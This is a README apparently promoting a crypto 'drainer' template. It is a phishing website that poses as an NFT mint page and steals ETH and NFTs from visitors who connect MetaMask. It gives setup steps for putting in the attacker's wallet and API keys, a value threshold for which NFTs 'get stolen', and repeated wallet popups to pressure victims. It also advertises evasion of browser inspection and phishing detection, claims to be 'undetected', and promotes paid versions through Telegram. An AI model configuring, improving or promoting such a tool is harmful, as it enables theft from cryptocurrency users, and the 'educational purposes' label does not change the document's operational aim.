# **👨🏻‍🎨 Welcome! Beware of [scams](https://github.com/captaingreem/Skid-Scammers-list), this is the real repo**
#### **⚠️Educational purposes ONLY. Better versions available at https://Tec.sellix.io** DM us [here](https://t.me/TecOnSellix)

## 🖼️ NFT Stealer / ETH Stealer / **V1** Drainer Template ` stable version `

![preview](https://user-images.githubusercontent.com/104867492/175178464-5b843aed-1fa4-4dfd-a102-1860b14b7bf5.png)
 [📋 List of Scammers/Skids](https://github.com/captaingreem/Skid-Scammers-list)

---

### 📩 DM us here: [@Zentoh](https://t.me/zentoh) or join our group [here](https://t.me/CryptoDrainers) to follow updates!

## ` 💎 Features `
- [x] Inspect Element Detection
- [x] Custom Design
- [x] Cool design 
- [x] Instant transactions
- [x] No contract required
- [x] Anti Metamask Phishing Detections
- [x] Anti F12 Inspect

---

## ` ✍ Setup Guide ` 
you need to edit the **settings.js** file only. 
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
- line 2: const infuraId = `"InfuraId";` replace this by **your https://Infura.io app ID**
- line 3: const moralisApi = `"MoralisApi";` replace this by **your https://admin.moralis.io/web3apis web3 x-api key (copy api key > v1)**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.

---

## ` ☁️ Important (Please Read it) ` 

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Edit lines : nftReceiveAddress: **"YOUR WALLET"**, replace this your ETH wallet address.
- Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
### ➢ To see the metamask popup, you must host the website

To get instant support, contact me on [Telegram](https://t.me/Zentoh)

---

## ` 🚦 Status `
🟢 Undetected & working

---

## ` 🌊 Socials `

- Telegram: https://t.me/Zentoh
- Shop: https://Tec.sellix.io
- Group: https://t.me/CryptoDrainers

##### Please ⭐ the repo to support our project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
